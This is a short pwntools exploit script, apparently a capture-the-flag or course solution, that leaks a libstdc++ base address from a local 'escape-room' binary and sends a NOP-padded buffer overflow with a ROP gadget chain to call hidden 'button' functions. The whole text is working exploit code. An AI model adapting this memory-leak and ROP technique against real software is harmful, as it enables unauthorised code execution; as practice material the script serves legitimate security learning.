from pwn import *

switch1 = 0x08052000 #on = 0xdeadbeef
switch2 = 0x08052004 #on = "SWE3025"

button1 = 0x08049276
button2 = 0x08049311


path = "escape-room"
p = process(path)

p.recvuntil(">>>")
p.sendline('5')
s = p.recvuntil(">>>").decode().split('\n')
for line in s:
    if "libstdc++.so.6" in line:
        index = s.index(line)
        base = s[index+1].split(':')[1][1:11]
        break

mov = p32(int(base,16) + 0x9b55a) #mov dword ptr [esi], edi; pop ebx; pop esi; pop edi; ret
pop = p32(int(base,16) + 0x9b55d) #pop esi; pop edi; ret
ROP = mov
payload = b'\x90'*28 + ROP + p32(button1) + p32(button2)

p.sendline('6')
print(p.recvuntil(">>>"))
_ = input()
p.sendline(payload)
p.interactive()
